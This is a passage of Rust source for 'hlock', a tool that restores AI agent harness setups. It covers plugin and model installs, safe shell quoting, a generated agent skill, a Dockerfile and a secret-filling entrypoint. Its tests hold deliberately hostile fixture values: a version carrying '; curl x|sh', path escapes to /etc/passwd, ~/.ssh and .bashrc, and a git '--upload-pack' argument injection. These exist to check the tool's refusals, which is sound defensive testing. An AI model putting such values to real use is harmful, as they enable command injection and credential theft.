            s.command = Some(shell_join(&argv));
            s.status = if have_bin { "auto" } else { "manual" }.into();
            s.reason = if have_bin { String::new() } else { "needs Claude Code installed".into() };
            s.action = have_bin.then_some(Action::Run { argv, env });
        }
        ("claude-code", "plugin") => {
            let installed = read_config(&root.join("plugins/installed_plugins.json"), "json").ok().flatten().unwrap_or_default();
            let have = installed["plugins"][&n.name][0]["version"].as_str().map(str::to_string);
            s.title = format!("Claude Code plugin {}{vtxt}", n.name);
            if have.is_some() && (have == n.version || n.version.is_none()) {
                s.reason = "installed".into();
                return Some(s);
            }
            let mut argv = vec![bin.clone(), "plugin".into(), "install".into(), n.name.clone()];
            if !n.enabled {
                argv = vec!["sh".into(), "-c".into(), format!("{0} plugin install {1} && {0} plugin disable {1}", shell_join(&[bin.clone()]), shell_join(&[n.name.clone()]))];
            }
            s.title = format!("Install Claude Code plugin {}{vtxt}", n.name);
            s.command = Some(if argv[0] == "sh" { argv[2].clone() } else { shell_join(&argv) });
            s.status = if have_bin { "auto" } else { "manual" }.into();
            s.reason = if have_bin { "installs the marketplace's current version".into() } else { "needs Claude Code installed".into() };
            s.action = have_bin.then_some(Action::Run { argv, env });
        }
        ("pi", "package") => {
            let lock = read_config(&root.join("npm/package-lock.json"), "json").ok().flatten().unwrap_or_default();
            let have = lock["packages"][format!("node_modules/{}", n.name)]["version"].as_str().map(str::to_string);
            s.title = format!("Pi package {}{vtxt}", n.name);
            if have.is_some() && (have == n.version || n.version.is_none()) {
                s.reason = "installed".into();
                return Some(s);
            }
            let spec = n.source.clone().unwrap_or_else(|| format!("npm:{}", n.name));
            let argv = vec![bin.clone(), "install".into(), spec];
            s.title = format!("Install Pi package {}{vtxt}", n.name);
            s.command = Some(shell_join(&argv));
            s.status = if have_bin { "auto" } else { "manual" }.into();
            s.reason = if have_bin { String::new() } else { "needs Pi installed".into() };
            s.action = have_bin.then_some(Action::Run { argv, env });
        }
        ("opencode", "plugin") => {
            s.title = format!("OpenCode plugin {}{vtxt}", n.name);
            s.reason = "OpenCode installs plugins listed in its config on startup".into();
        }
        (_, "package") if n.source.as_deref().is_some_and(|x| x.starts_with("pypi:")) => {
            let have = python_package_versions(&[n.name.clone()], profile.run.python.as_deref(), t).get(&n.name).cloned();
            let pkg = n.name.trim_start_matches("pypi:");
            s.kind = "package".into();
            s.title = format!("Python package {pkg}{vtxt}");
            if have.is_some() && have == n.version {
                s.reason = "installed".into();
                return Some(s);
            }
            if let Some(why) = install_values_problem(Some(pkg), n.version.as_deref()) {
                return Some(refused(s.id, "package", s.title, why));
            }
            let spec = format!("{pkg}{}", n.version.as_deref().map(|v| format!("=={v}")).unwrap_or_default());
            let argv = if ctx.which("uv").is_some() { vec!["uv".into(), "pip".into(), "install".into(), spec] } else { vec!["python3".into(), "-m".into(), "pip".into(), "install".into(), spec] };
            s.title = format!("Install Python package {pkg}{vtxt}");
            s.command = Some(shell_join(&argv));
            s.status = if opts.install { "auto" } else { "manual" }.into();
            s.reason = if opts.install { String::new() } else { "package installs run only with --install".into() };
            s.action = opts.install.then_some(Action::Run { argv, env: BTreeMap::new() });
        }
        _ => {
            s.title = format!("{} {}{vtxt}", n.kind, n.name);
            s.status = "manual".into();
            s.reason = "hlock doesn't know how to install this kind yet".into();
            s.command = n.source.clone();
        }
    }
    Some(s)
}

fn runtime_steps(rt: &Runtime, used: &BTreeSet<(String, String)>, reg: &Registry, ctx: &Ctx, opts: &SyncOptions, docker: bool) -> Vec<Step> {
    let mut out = Vec::new();
    let base_id = rt.name.split('@').next().unwrap_or(&rt.name);
    let Some(profile) = reg.runtime(base_id) else { return out };
    let is_used = |m: &str| used.contains(&(rt.name.clone(), m.to_string()));
    if rt.location != "local" || docker {
        let models: Vec<&str> = rt.model.iter().map(|m| m.id.as_str()).collect();
        let endpoint = rt.endpoint.clone().unwrap_or_default();
        out.push(Step {
            id: format!("runtime:{}", rt.name),
            kind: "runtime".into(),
            title: format!("{} at {endpoint}", profile.name),
            status: "manual".into(),
            reason: format!(
                "{} server; make sure it's running and serving: {}",
                if docker { "reached from the container via host.docker.internal; a host" } else { "a self-hosted" },
                if models.is_empty() { "(no models listed)".to_string() } else { models.join(", ") }
            ),
            verify: (!endpoint.is_empty()).then(|| format!("curl -s {}", fsutil::shell_quote(&format!("{}/models", endpoint.trim_end_matches('/'))))),
            optional: !rt.model.iter().any(|m| is_used(&m.id)),
            ..Default::default()
        });
        return out;
    }
    let probe = probe_runtime(profile, ctx);
    let bin = profile.binaries.first().cloned().unwrap_or_default();
    if probe.installed {
        out.push(Step { id: format!("runtime:{}", rt.name), kind: "runtime".into(), title: format!("{} {}", profile.name, probe.version.unwrap_or_default()), reason: "installed".into(), ..Default::default() });
    } else {
        let mut s = install_step(format!("runtime:{}", rt.name), "runtime", &profile.name, rt.version.as_deref(), rt.source.as_deref(), &profile.install, opts, Some(format!("{bin} --version")), ctx);
        if rt.source.is_none() {
            s.command = profile.install.iter().find_map(|m| install_command(&m.method, m.package.as_deref(), None, m.command.as_deref()).map(|a| shell_join(&a)).or_else(|| m.command.clone()));
        }
        out.push(s);
    }
    for m in &rt.model {
        let here = locate_model(profile, &m.id, ctx);
        let optional = !is_used(&m.id) && !opts.all_models;
        let size = m.size_bytes.map(|b| format!(" ({:.1} GB)", b as f64 / 1e9)).unwrap_or_default();
        let mut s = Step { id: format!("model:{}/{}", rt.name, m.id), kind: "model".into(), title: format!("{} model {}{size}", profile.name, m.id), optional, size_bytes: m.size_bytes, ..Default::default() };
        let matches = here.present && (m.digest.is_none() || here.digest == m.digest) && (m.revision.is_none() || here.revision == m.revision);
        if matches {
            s.reason = "on disk".into();
        } else {
            let repo = m.source.as_deref().and_then(|x| x.strip_prefix("hf://")).unwrap_or(&m.id);
            let revision = m.revision.as_deref().unwrap_or("main");
            s.title = format!("Pull {} model {}{size}", profile.name, m.id);
            // each value goes into `sh -c`: a plain token, quoted
            if let Some((what, v)) = [("model", m.id.as_str()), ("repo", repo), ("revision", revision)].into_iter().find(|(_, v)| !fsutil::plain_token(v)) {
                s.status = "manual".into();
                s.reason = format!("refusing to pull: the {what} {v:?} has characters that aren't allowed");
                out.push(s);
                continue;
            }
            let q = fsutil::shell_quote;
            let cmd = profile.pull.as_ref().map(|p| p.replace("{model}", &q(&m.id)).replace("{repo}", &q(repo)).replace("{revision}", &q(revision)).replace(" {file}", ""));
            s.command = cmd.clone();
            s.verify = (bin == "ollama").then(|| "ollama list".to_string());
            let can = cmd.is_some() && probe.installed;
            if opts.pull && can && !optional {
                s.status = "auto".into();
                s.action = cmd.map(|c| Action::Run { argv: vec!["sh".into(), "-c".into(), c], env: BTreeMap::new() });
            } else {
                s.status = "manual".into();
                s.reason = if !probe.installed {
                    format!("needs {} installed first", profile.name)
                } else if optional {
                    "not used by a locked role; pull it with --all-models".into()
                } else {
                    "model downloads run only with --pull".into()
                };
                if here.present && m.digest.is_some() && here.digest != m.digest {
                    s.reason = format!("a different build is on disk; {}", s.reason);
                }
            }
        }
        out.push(s);
    }
    out
}

// --------------------------------------------------------------------------- //
// Running steps
// --------------------------------------------------------------------------- //

fn backup(path: &Path) -> Result<Option<PathBuf>> {
    if !path.exists() {
        return Ok(None);
    }
    let bak = PathBuf::from(format!("{}.hlock-bak", path.display()));
    if bak.is_dir() {
        std::fs::remove_dir_all(&bak)?;
    } else if bak.exists() {
        std::fs::remove_file(&bak)?;
    }
    std::fs::rename(path, &bak)?;
    Ok(Some(bak))
}

/// Copy a directory tree without following symlinks ([`fsutil::copy_tree`]).
pub(crate) fn copy_tree(from: &Path, to: &Path) -> Result<()> {
    fsutil::copy_tree(from, to).map(|_| ())
}

/// The most of an instruction file hlock copies.
const MAX_INSTRUCTIONS: usize = 10 * 1024 * 1024;

/// How long an installer or a model download may take.
const RUN_TIMEOUT: Duration = Duration::from_secs(4 * 3600);

/// A directory of its own under the system temp dir, removed when dropped (on every
/// path, errors included).
struct TempDir(PathBuf);

impl TempDir {
    fn new(tag: &str) -> Result<TempDir> {
        use std::sync::atomic::{AtomicU64, Ordering};
        static N: AtomicU64 = AtomicU64::new(0);
        let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.subsec_nanos()).unwrap_or(0);
        for _ in 0..16 {
            let p = std::env::temp_dir().join(format!("hlock-{tag}-{}-{nanos}-{}", std::process::id(), N.fetch_add(1, Ordering::Relaxed)));
            // create_dir fails when it exists: never reuse a directory someone else made
            match std::fs::create_dir(&p) {
                Ok(()) => return Ok(TempDir(p)),
                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
                Err(e) => return Err(e.into()),
            }
        }
        Err(Error::Profile("can't create a temporary directory".into()))
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

/// Run git with the context's environment, never prompting, and fail on a non-zero exit.
fn git(git: &Path, args: &[&str], ctx: &Ctx) -> Result<String> {
    let mut cmd = std::process::Command::new(git);
    cmd.args(args).current_dir(&ctx.cwd).env_clear().envs(&ctx.env).env("GIT_TERMINAL_PROMPT", "0").stdin(std::process::Stdio::null());
    let out = process::run(cmd, &Limits::timeout(Duration::from_secs(600))).map_err(|e| Error::Profile(format!("cannot run git: {e}")))?;
    if out.success {
        Ok(out.stdout_text())
    } else {
        let why = if out.timed_out { "timed out".to_string() } else { out.stderr_text().trim().lines().last().unwrap_or("failed").to_string() };
        Err(Error::Profile(format!("git {} failed: {why}", args.iter().find(|a| !a.starts_with('-')).unwrap_or(&""))))
    }
}

/// Perform one `auto` step and describe what happened.
pub fn run_step(step: &Step, ctx: &Ctx) -> Result<String> {
    let Some(action) = &step.action else { return Ok("nothing to do".into()) };
    match action {
        Action::WriteConfig { path, vendored, format, pointers, fallback, env_ref } => {
            let resolve = resolver(ctx);
            let d = desired_config(vendored, format, pointers, path, fallback.as_deref(), &resolve, env_ref.as_deref())?;
            let missing = d.missing;
            let fmt = if format == "jsonc" { "json" } else { format.as_str() };
            let text = render_config(&d.doc, fmt).map_err(Error::Profile)?;
            let b = PathBuf::from(format!("{}.hlock-bak", path.display()));
            if env_ref.is_some() {
                // an isolated root is restored from the lock; a backup would only keep old values on disk
                let _ = std::fs::remove_file(&b);
            }
            // the old file may hold secrets: its backup is the owner's only, from the start
            let bak = if env_ref.is_none() && std::fs::symlink_metadata(path).is_ok_and(|m| m.is_file()) {
                fsutil::clear_symlink(&b)?;
                fsutil::copy_private(path, &b)?;
                Some(b)
            } else {
                None
            };
            if d.has_secrets {
                fsutil::write_private(path, text)?; // it may hold secret values: owner only
            } else {
                fsutil::write_atomic(path, text)?;
            }
            let mut msg = format!("wrote {}", path.display());
            if let Some(b) = bak {
                msg.push_str(&format!(" (previous: {})", b.display()));
            }
            if !missing.is_empty() {
                msg.push_str(&format!("; placeholders left for {}", missing.into_iter().collect::<Vec<_>>().join(", ")));
            }
            Ok(msg)
        }
        Action::CopyDir { from, to } => {
            if !std::fs::symlink_metadata(from).is_ok_and(|m| m.is_dir()) {
                return Err(Error::Lockfile(format!("vendored copy missing: {}", from.display())));
            }
            let bak = backup(to)?;
            copy_tree(from, to)?;
            Ok(match bak {
                Some(b) => format!("copied to {} (previous: {})", to.display(), b.display()),
                None => format!("copied to {}", to.display()),
            })
        }
        Action::CopyFile { from, to } => {
            let data = fsutil::read_regular(from, MAX_INSTRUCTIONS).map_err(|e| Error::Lockfile(format!("vendored copy {}: {e}", from.display())))?;
            if std::fs::symlink_metadata(to).is_ok_and(|m| m.is_file()) {
                let b = PathBuf::from(format!("{}.hlock-bak", to.display()));
                fsutil::clear_symlink(&b)?;
                std::fs::copy(to, &b)?;
            }
            fsutil::write_atomic(to, data)?;
            Ok(format!("wrote {}", to.display()))
        }
        Action::GitSkill { url, commit, subpath, to, name, scripts } => {
            if let Some(why) = git_source_problem(url, commit, subpath) {
                return Err(Error::Lockfile(why));
            }
            let bin = ctx.which("git").ok_or_else(|| Error::Profile("git isn't on PATH".into()))?;
            let tmp = TempDir::new("skill")?;
            let clone = tmp.0.join("repo");
            let clone_s = clone.to_string_lossy().into_owned();
            git(&bin, &["-c", "protocol.ext.allow=never", "-c", "protocol.file.allow=never", "clone", "--quiet", "--", url, &clone_s], ctx)?;
            git(&bin, &["-C", &clone_s, "checkout", "--quiet", "--detach", commit, "--"], ctx)?;
            // a full hash names exactly one commit: check that's what was checked out
            if matches!(commit.len(), 40 | 64) && commit.chars().all(|c| c.is_ascii_hexdigit()) {
                let head = git(&bin, &["-C", &clone_s, "rev-parse", "HEAD"], ctx)?;
                if !head.trim().eq_ignore_ascii_case(commit) {
                    return Err(Error::Profile(format!("{url}: checked out {} instead of {commit}", head.trim())));
                }
            }
            let src = if subpath.is_empty() { clone.clone() } else { clone.join(subpath) };
            let is_dir = std::fs::symlink_metadata(&src).is_ok_and(|m| m.is_dir());
            if !is_dir || !fsutil::within(&clone, &src) || !std::fs::symlink_metadata(src.join("SKILL.md")).is_ok_and(|m| m.is_file()) {
                return Err(Error::Profile(format!("{url}@{commit} has no skill at {subpath}")));
            }
            if let Some(why) = crate::trust::unlisted_scripts(name, scripts.as_ref(), &src) {
                return Err(Error::Audit(why));
            }
            backup(to)?;
            copy_tree(&src, to)?;
            Ok(format!("fetched into {}", to.display()))
        }
        Action::Run { argv, env } => {
            let Some((bin, args)) = argv.split_first() else { return Err(Error::Profile("nothing to run: the command is empty".into())) };
            let mut cmd = std::process::Command::new(bin);
            // the same environment every other runner uses, plus the step's own
            cmd.args(args).current_dir(&ctx.cwd).env_clear().envs(&ctx.env).envs(env).stdin(std::process::Stdio::null());
            // installers may start a daemon on purpose (`ollama serve`): leave what they start
            let limits = Limits { timeout: Some(RUN_TIMEOUT), kill_leftovers: false, ..Default::default() };
            let out = process::run(cmd, &limits).map_err(|e| Error::Profile(format!("cannot run {bin}: {e}")))?;
            if out.success {
                Ok(format!("ran {}", shell_join(argv)))
            } else {
                let text = out.text();
                let tail: Vec<&str> = text.lines().rev().take(8).collect::<Vec<_>>().into_iter().rev().collect();
                let status = if out.timed_out { format!("timed out after {}s", RUN_TIMEOUT.as_secs()) } else { format!("exited with {}", out.code.map(|c| c.to_string()).unwrap_or_else(|| "a signal".into())) };
                Err(Error::Profile(format!("`{}` {status}:\n{}", shell_join(argv), tail.join("\n"))))
            }
        }
        Action::WriteFile { path, content } => {
            fsutil::write_atomic(path, content)?;
            Ok(format!("wrote {}", path.display()))
        }
        Action::WriteHooks { path, format, pointer, entries, set } => {
            let mut doc = read_config(path, format)?.unwrap_or_else(|| json!({}));
            let entries = entries.as_object().cloned().unwrap_or_default();
            crate::decide::merge_hooks(&mut doc, pointer, &entries);
            for (k, v) in set {
                doc[k.as_str()] = v.clone();
            }
            // a settings file may hold secrets: written whole or not at all, keeping its mode
            fsutil::write_atomic(path, render_config(&doc, format).map_err(Error::Profile)?)?;
            let n: usize = entries.values().filter_map(Value::as_array).map(Vec::len).sum();
            Ok(if n == 0 { format!("removed hlock's hooks from {}", path.display()) } else { format!("wrote {n} hook{} into {}", if n == 1 { "" } else { "s" }, path.display()) })
        }
        Action::Remove { path } => {
            let bak = backup(path)?;
            Ok(format!("moved {} aside to {}", path.display(), bak.map(|b| b.display().to_string()).unwrap_or_default()))
        }
        Action::FetchDep { entry, to, project, allow_hidden, allowed } => {
            let content = crate::deps::fetch_locked(entry, project, ctx)?;
            if let crate::deps::Entry::Skill(s) = entry.as_ref() {
                if let Some(why) = crate::trust::unlisted_scripts(&s.name, s.scripts.as_ref(), &content) {
                    return Err(Error::Audit(why));
                }
            }
            // what was fetched is scanned before it's placed (an exception the lock records
            // is approved here by digest, and fetch_locked checks the digest)
            if !allowed {
                let f = crate::scan::scan_path(&content, &pretty(to, ctx));
                crate::audit::blocking(&f, allow_hidden, &format!("{} {}", entry.kind(), entry.name()))?;
            }
            // what's there is set aside under .hlock/bak, where the harness doesn't read it
            let bak = if std::fs::symlink_metadata(to).is_ok() { Some(crate::deps::set_aside(to, project)?) } else { None };
            if content.is_dir() {
                copy_tree(&content, to)?;
            } else {
                fsutil::write_atomic(to, std::fs::read(&content)?)?;
            }
            Ok(match bak {
                Some(b) => format!("fetched {} {} into {} (previous: {})", entry.kind(), entry.name(), to.display(), b.display()),
                None => format!("fetched {} {} into {}", entry.kind(), entry.name(), to.display()),
            })
        }
        Action::WriteMcp { dest, name, entry } => {
            crate::deps::write_mcp(dest, name, Some(entry))?;
            Ok(format!("configured MCP server {name} in {}", dest.path.display()))
        }
    }
}

// --------------------------------------------------------------------------- //
// Agent-guided rehydration and Docker
// --------------------------------------------------------------------------- //

/// An Agent Skill (`SKILL.md`) that walks an agent through the plan's remaining steps.
pub fn rehydrate_skill(plan: &Plan, lock_name: &str) -> String {
    let mut s = String::new();
    s.push_str(&format!(
        "---\nname: hlock-rehydrate\ndescription: Rehydrate the {} setup pinned in {lock_name} on this machine. Use when the user asks to set up, restore, or sync their agent harness from {lock_name}.\n---\n\n",
        plan.harness_name
    ));
    s.push_str(&format!("# Rehydrate {} from `{lock_name}`\n\n", plan.harness_name));
    s.push_str(&format!(
        "This skill was generated by `hlock sync --skill` from `{lock_name}`. It lists what is still missing to reproduce the pinned {} {} setup, in order.\n\n",
        plan.harness_name,
        plan.version.as_deref().unwrap_or("")
    ));
    let (sync_cmd, check_cmd) = plan.commands();
    s.push_str(&format!("## Rules\n\n- Ask the user before installing system software or downloading large model weights, and say how big the download is.\n- Never print, log, or commit secret values. Ask the user to set secrets in their shell; don't type them yourself.\n- Run each step's check before moving on. If a step fails, stop and report the error.\n- Finish by running `{sync_cmd}`, which performs the remaining automatic steps, then `{check_cmd}`.\n\n"));
    if let (true, Some(p)) = (plan.mode == "prefix", &plan.prefix) {
        s.push_str(&format!("The setup is restored into an isolated config root under `{p}`, not the user's own config. Don't change the user's own config unless they ask.\n\n"));
    }
    let pending: Vec<&Step> = plan.steps.iter().filter(|st| st.status != "satisfied" && !st.optional).collect();
    if pending.is_empty() {
        s.push_str(&format!("## Steps\n\nNothing is missing. Run `{check_cmd}` to confirm.\n"));
        return s;
    }
    s.push_str("## Steps\n\n");
    for (i, st) in pending.iter().enumerate() {
        s.push_str(&format!("{}. **{}**", i + 1, st.title));
        if st.status == "auto" {
            s.push_str(&format!(" (`{sync_cmd}` does this)"));
        }
        s.push('\n');
        if !st.reason.is_empty() {
            s.push_str(&format!("   - Why: {}\n", st.reason));
        }
        if let Some(c) = &st.command {
            s.push_str(&format!("   - Run: `{c}`\n"));
        }
        if let Some(v) = &st.verify {
            s.push_str(&format!("   - Check: `{v}`\n"));
        }
    }
    let optional: Vec<&Step> = plan.steps.iter().filter(|st| st.status != "satisfied" && st.optional).collect();
    if !optional.is_empty() {
        s.push_str("\n## Optional\n\n");
        for st in optional {
            s.push_str(&format!("- {}{}\n", st.title, st.command.as_ref().map(|c| format!(": `{c}`")).unwrap_or_default()));
        }
    }
    s.push_str(&format!("\n## Finish\n\n1. Run `{sync_cmd}` and confirm it reports no remaining steps.\n2. Run `{check_cmd}`.\n"));
    s
}

/// `s` on one line, for a Dockerfile: a newline in a value from the lock would start an
/// instruction of its own.
fn one_line(s: &str) -> String {
    s.chars().map(|c| if c.is_control() { ' ' } else { c }).collect()
}

/// A Dockerfile and entrypoint for a plan built with `SyncOptions::docker`.
/// Files the plan writes under `<context>/home` are copied to the image's home;
/// secrets stay placeholders in the image and are filled from `-e` at start-up.
pub fn dockerfile(plan: &Plan, lock: &Lockfile, profile: &HarnessProfile) -> (String, String) {
    let mut d = String::new();
    d.push_str(&format!("# Generated by `hlock sync --docker` for {} {}. Rebuild after re-pinning.\n", plan.harness_name, one_line(plan.version.as_deref().unwrap_or(""))));
    d.push_str("FROM node:22-bookworm\n");
    d.push_str("RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates curl git python3 && rm -rf /var/lib/apt/lists/*\n");
    d.push_str("RUN curl -LsSf https://astral.sh/uv/install.sh | env UV_INSTALL_DIR=/usr/local/bin sh\n");
    let version = lock.harness.version.as_deref();
    let (method, package) = lock.harness.source.as_deref().map(parse_source).unwrap_or_default();
    // Linux has no Homebrew casks: prefer the recorded method, else the profile's npm/script/pip method.
    let script = profile.install.iter().find(|m| m.method == "script").and_then(|m| m.command.clone());
    let install = install_command(&method, package.as_deref(), version, script.as_deref())
        .filter(|a| a[0] != "brew")
        .or_else(|| profile.install.iter().find_map(|m| install_command(&m.method, m.package.as_deref(), version, m.command.as_deref()).filter(|a| a[0] != "brew")));
    // nothing that isn't trusted here goes into the image either
    let gated = |id: &str| plan.executables.iter().any(|e| matches!(e.status.as_str(), "untrusted" | "denied") && e.steps.iter().any(|s| s == id));
    let install = install.filter(|_| !gated("harness"));
    match install {
        Some(_) | None if gated("harness") => d.push_str(&format!("# {} isn't installed: its install source isn't trusted on the machine that wrote this (hlock trust)\n", plan.harness_name)),
        Some(a) if a[0] == "sh" => d.push_str(&format!("RUN {}\n", one_line(&a[2]))),
        Some(a) => d.push_str(&format!("RUN {}\n", shell_join(&a.iter().map(|x| if x == "python3" { "uv".to_string() } else { x.clone() }).collect::<Vec<_>>()).replace("uv -m pip install", "uv pip install --system"))),
        None => d.push_str(&format!("# TODO: install {} here; hlock has no scriptable Linux install for it\n", plan.harness_name)),
    }
    for st in plan.steps.iter().filter(|s| s.kind == "plugin" && s.status == "auto") {
        if let Some(Action::Run { argv, .. }) = &st.action {
            let cmd = match argv.as_slice() {
                [sh, _, c] if sh == "sh" => c.clone(),
                _ => shell_join(argv),
            };
            d.push_str(&format!("RUN {} || echo {}\n", one_line(&cmd), fsutil::shell_quote(&format!("warning: {} failed", one_line(&st.id)))));
        }
    }
    for st in plan.steps.iter().filter(|s| s.kind == "package" && s.status != "satisfied" && !gated(&s.id)) {
        if let Some(c) = &st.command {
            d.push_str(&format!("RUN {}\n", one_line(&c.replace("uv pip install", "uv pip install --system").replace("python3 -m pip install", "uv pip install --system"))));
        }
    }
    d.push_str("COPY home/ /root/\n");
    d.push_str("COPY hlock-entrypoint /usr/local/bin/hlock-entrypoint\n");
    for rt in lock.runtime.iter().filter(|r| r.location == "local") {
        if let Some((_, Some(port))) = rt.endpoint.as_deref().and_then(host_port) {
            d.push_str(&format!("# {} runs on the host: point the harness at http://host.docker.internal:{port}\n", one_line(&rt.name)));
        }
    }
    let secrets: Vec<&str> = plan.steps.iter().filter(|s| s.kind == "secret").map(|s| s.id.trim_start_matches("secret:")).collect();
    if !secrets.is_empty() {
        d.push_str(&format!("# Secrets (pass with -e): {}\n", one_line(&secrets.join(" "))));
    }
    d.push_str("WORKDIR /workspace\nENTRYPOINT [\"/usr/local/bin/hlock-entrypoint\"]\n");
    let bin = profile.binaries.first().cloned().unwrap_or_else(|| "bash".into());
    d.push_str(&format!("CMD [\"{bin}\"]\n"));

    let entry = r#"#!/bin/sh
# Fill ${HLOCK_SECRET_*} placeholders in the harness config, then run. A value comes from
# the environment (docker run -e), else from a mounted secret file: /run/secrets/<NAME>,
# with or without the HLOCK_SECRET_ prefix (Docker and Compose secrets; HLOCK_SECRETS_DIR moves it).
python3 - <<'PY'
import os, pathlib, re
pat = re.compile(r"\$\{(HLOCK_SECRET_[A-Z0-9_]+)\}")
def value(name):
    if os.environ.get(name):
        return os.environ[name]
    for f in (name, name.removeprefix("HLOCK_SECRET_")):
        p = pathlib.Path(os.environ.get("HLOCK_SECRETS_DIR", "/run/secrets")) / f
        if p.is_file():
            return p.read_text().strip()
    return None
for p in pathlib.Path.home().rglob("*"):
    if p.is_file() and p.suffix in {".json", ".jsonc", ".toml", ".yaml", ".yml"} and p.stat().st_size < 5_000_000:
        try:
            text = p.read_text()
        except Exception:
            continue
        new = pat.sub(lambda m: value(m.group(1)) or m.group(0), text)
        if new != text:
            # secret values: a new file that is the owner's only from the start, then a rename
            tmp = p.with_name(f".{p.name}.hlock-tmp")
            tmp.unlink(missing_ok=True)
            fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
            with os.fdopen(fd, "w") as f:
                f.write(new)
            os.replace(tmp, p)
PY
exec "$@"
"#
    .to_string();
    (d, entry)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::capture::parse_config;

    #[test]
    fn plan_commands_target_the_same_place() {
        let plan = |mode: &str, prefix: Option<&str>| Plan { mode: mode.into(), prefix: prefix.map(String::from), ..Default::default() }.commands();
        assert_eq!(plan("prefix", Some(".hlock/env")), ("hlock sync --prefix .hlock/env".into(), "hlock check --prefix .hlock/env".into()));
        assert_eq!(plan("home", None), ("hlock sync --in-place".into(), "hlock check".into()));
    }

    #[test]
    fn placeholder_fill_keeps_existing_secrets() {
        let desired = json!({"a": {"apiKey": "${HLOCK_SECRET_A}"}, "b": "Bearer ${HLOCK_SECRET_B}", "c": "${HLOCK_SECRET_C}"});
        let actual = json!({"a": {"apiKey": "real-key"}});
        let env: BTreeMap<String, String> = [("HLOCK_SECRET_B".to_string(), "tok".to_string())].into();
        let mut missing = BTreeSet::new();
        let v = fill(&desired, Some(&actual), &|n: &str| env.get(n).cloned(), &mut missing);
        assert_eq!(v, json!({"a": {"apiKey": "real-key"}, "b": "Bearer tok", "c": "${HLOCK_SECRET_C}"}));
        assert_eq!(missing.into_iter().collect::<Vec<_>>(), ["HLOCK_SECRET_C"]);
        // as environment references: the values come back separately, the file keeps references
        let mut values = BTreeMap::new();
        extract(&desired, &v, &mut values);
        assert_eq!(values, [("HLOCK_SECRET_A".to_string(), "real-key".to_string()), ("HLOCK_SECRET_B".to_string(), "tok".to_string())].into());
        assert_eq!(to_refs(&desired, "{env:{name}}")["b"], "Bearer {env:HLOCK_SECRET_B}");
        // a reference left by `launch` isn't a configured value to keep
        let refs = json!({"c": "{env:HLOCK_SECRET_C}"});
        let mut missing = BTreeSet::new();
        assert_eq!(fill(&json!({"c": "${HLOCK_SECRET_C}"}), Some(&refs), &|_: &str| None, &mut missing)["c"], "${HLOCK_SECRET_C}");
        assert!(missing.contains("HLOCK_SECRET_C"));
    }

    #[test]
    fn pointers_and_sources() {
        let mut v = json!({"keep": 1});
        set_pointer(&mut v, "/mcpServers", json!({"gh": {}}));
        set_pointer(&mut v, "/a/b~1c", json!(2));
        assert_eq!(v, json!({"keep": 1, "mcpServers": {"gh": {}}, "a": {"b/c": 2}}));
        assert_eq!(parse_source("npm:@scope/pkg@1.2.3"), ("npm".into(), Some("@scope/pkg".into())));
        assert_eq!(parse_source("brew-cask:claude-code@2.1.285"), ("brew-cask".into(), Some("claude-code".into())));
        assert_eq!(parse_source("pypi:vllm==0.11.2"), ("pip".into(), Some("vllm".into())));
        assert_eq!(parse_source("script@0.20.0"), ("script".into(), None));
        assert_eq!(
            install_command("npm", Some("@openai/codex"), Some("0.5.0"), None).unwrap(),
            ["npm", "install", "-g", "@openai/codex@0.5.0"]
        );
        assert_eq!(install_command("script", None, Some("2.1"), Some("curl x | bash -s {version}")).unwrap()[2], "curl x | bash -s 2.1");
        assert!(install_command("app", None, None, None).is_none());
    }

    #[test]
    fn parse_jsonc_vendored() {
        assert!(parse_config("{\"a\": 1,}", "jsonc").is_ok());
    }

    // ----------------------------------------------------------------------- //
    // A lock from someone else (`hlock pull`): what sync refuses to do for it
    // ----------------------------------------------------------------------- //

    use crate::lockfile::{Decider, Harness, Instructions, Native, Skill};

    fn sandbox(tag: &str) -> (PathBuf, Ctx) {
        let dir = std::env::temp_dir().join(format!("hlock-sync-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("home")).unwrap();
        std::fs::create_dir_all(dir.join("proj")).unwrap();
        let ctx = Ctx { home: dir.join("home"), cwd: dir.join("proj"), env: BTreeMap::from([("PATH".to_string(), "/usr/bin:/bin".to_string())]), path: vec![] };
        (dir, ctx)
    }

    fn vendor(ctx: &Ctx, rel: &str, text: &str) {
        let p = ctx.cwd.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    }

    fn step<'a>(plan: &'a Plan, id: &str) -> &'a Step {
        plan.steps.iter().find(|s| s.id == id).unwrap_or_else(|| panic!("no step {id}: {:?}", plan.steps.iter().map(|s| &s.id).collect::<Vec<_>>()))
    }

    fn hostile_lock() -> Lockfile {
        let skill = |name: &str, path: &str| Skill { name: name.into(), origin: "local".into(), path: Some(path.into()), vendored: Some(".hlock/vendor/s".into()), enabled: true, ..Default::default() };
        Lockfile {
            harness: Harness { name: "claude-code".into(), version: Some("1; curl x|sh".into()), source: Some("script@1".into()), ..Default::default() },
            instructions: vec![
                Instructions { name: "~/.zshrc".into(), digest: None, scope: "user".into(), vendored: Some(".hlock/vendor/rc".into()), ..Default::default() },
                Instructions { name: "{root}/settings.json".into(), digest: None, scope: "user".into(), vendored: Some(".hlock/vendor/rc".into()), ..Default::default() },
                Instructions { name: "{root}/CLAUDE.md".into(), digest: None, scope: "user".into(), vendored: Some("../../etc/passwd".into()), ..Default::default() },
                Instructions { name: "CLAUDE.md".into(), digest: None, scope: "project".into(), vendored: Some(".hlock/vendor/rc".into()), ..Default::default() },
            ],
            skill: vec![
                skill("../evil", "{root}/skills/evil"),
                skill("ssh", "~/.ssh"),
                skill("up", "{root}/skills/../../../.bashrc"),
                skill("fine", "{root}/skills/fine"),
                Skill { name: "git".into(), origin: "third-party".into(), path: Some("{root}/skills/git".into()), source: Some("git+https://h.example/r@éééééééééééé#path=s".into()), enabled: true, ..Default::default() },
                Skill { name: "opt".into(), origin: "third-party".into(), path: Some("{root}/skills/opt".into()), source: Some("git+--upload-pack=touch X@abc#path=s".into()), enabled: true, ..Default::default() },
            ],
            decider: vec![
